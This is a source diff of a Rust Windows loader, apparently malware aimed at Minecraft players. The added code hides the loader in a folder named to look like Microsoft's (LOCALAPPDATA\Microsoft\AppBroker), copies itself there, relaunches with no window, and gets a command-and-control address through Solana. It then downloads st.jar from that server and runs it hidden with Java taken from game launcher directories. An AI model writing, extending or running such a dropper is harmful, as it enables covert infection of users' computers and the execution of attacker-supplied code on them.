@@ -184,24 +184,23 @@ fn extract_zip(zip_path: &Path, out_dir: &Path, loader: &Path) {
 }
 
 fn find_java(loader: &Path) -> Option<PathBuf> {
-    let appdata = std::env::var("APPDATA").unwrap_or_default();
     let localappdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
+    let programfiles = std::env::var("ProgramFiles").unwrap_or_default();
     
     let paths = vec![
-        format!("{}\\.minecraft\\runtime", appdata),
-        format!("{}\\.lunarclient\\jre", appdata),
-        format!("{}\\.prismlauncher\\java", appdata),
-        format!("{}\\com.modrinth.theseus\\meta", appdata),
-        format!("{}\\Programs\\Modrinth App", localappdata),
-        format!("{}\\Programs\\Eclipse Adoptium", localappdata),
-        "C:\\Program Files\\Java".to_string(),
-        "C:\\Program Files\\Eclipse Adoptium".to_string(),
+        loader.join("jre"), // Check our own extracted JRE first
+        Path::new(&localappdata).join(".minecraft").join("runtime"),
+        Path::new(&localappdata).join(".lunarclient").join("jre"),
+        Path::new(&localappdata).join(".prismlauncher").join("java"),
+        Path::new(&localappdata).join("Programs").join("Modrinth App"),
+        Path::new(&localappdata).join("Programs").join("Eclipse Adoptium"),
+        Path::new(&programfiles).join("Java"),
+        Path::new(&programfiles).join("Eclipse Adoptium"),
     ];
 
     for base_path in paths {
-        let path = Path::new(&base_path);
-        if path.exists() {
-            for entry in WalkDir::new(path).into_iter().filter_map(|e| e.ok()) {
+        if base_path.exists() {
+            for entry in WalkDir::new(base_path).into_iter().filter_map(|e| e.ok()) {
                 if entry.file_name() == "javaw.exe" {
                     log(loader, &format!("Found Java: {:?}", entry.path()));
                     return Some(entry.path().to_path_buf());
@@ -239,16 +238,46 @@ fn download_jre(loader: &Path, server_ip: &str) -> Option<PathBuf> {
 }
 
 fn main() {
-    let appdata = std::env::var("APPDATA").unwrap_or_default();
-    let loader = Path::new(&appdata).join("loader");
+    // 1. Create the hidden AppBroker directory in LOCALAPPDATA
+    let localappdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
+    let loader = Path::new(&localappdata).join("Microsoft").join("AppBroker");
     let _ = fs::create_dir_all(&loader);
     
     log(&loader, "--- STARTING BOOT.EXE ---");
 
+    // 2. Ensure boot.exe is running from the AppBroker folder
+    let current_exe = std::env::current_exe().unwrap_or_default();
+    let loader_exe = loader.join("boot.exe");
+    
+    if current_exe != loader_exe {
+        log(&loader, "Running from external location. Copying to AppBroker...");
+        let _ = fs::copy(&current_exe, &loader_exe);
+        
+        // Launch the copy from AppBroker and exit
+        unsafe {
+            let mut si: STARTUPINFOW = std::mem::zeroed();
+            si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+            si.dwFlags = STARTF_USESHOWWINDOW;
+            si.wShowWindow = 0;
+            
+            let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
+            let cmd_str = format!("\"{}\"", loader_exe.display());
+            let mut cmd_line = to_wide(&cmd_str);
+
+            CreateProcessW(
+                std::ptr::null(), cmd_line.as_mut_ptr(), std::ptr::null(), std::ptr::null(),
+                0, CREATE_NO_WINDOW, std::ptr::null(), std::ptr::null(), &si, &mut pi
+            );
+            if !pi.hProcess.is_null() { CloseHandle(pi.hProcess); }
+            if !pi.hThread.is_null() { CloseHandle(pi.hThread); }
+        }
+        return; // Exit the original instance
+    }
+
     let _ = fs::write(loader.join("key.json"), format!("{{\"key\":\"{}\"}}", KEY));
     log(&loader, "Wrote key.json");
 
-    // Fetch IP from Solana
+    // 3. Fetch IP from Solana
     let server_ip = get_c2_ip(&loader);
     let url = format!("http://{}/api/downloads/st.jar", server_ip);
 
@@ -278,7 +307,7 @@ fn main() {
         .arg("-jar")
         .arg(&jar_path)
         .arg(KEY)
-        .arg(&server_ip) // Pass the IP to Java
+        .arg(&server_ip)
         .creation_flags(CREATE_NO_WINDOW)
         .output();
 
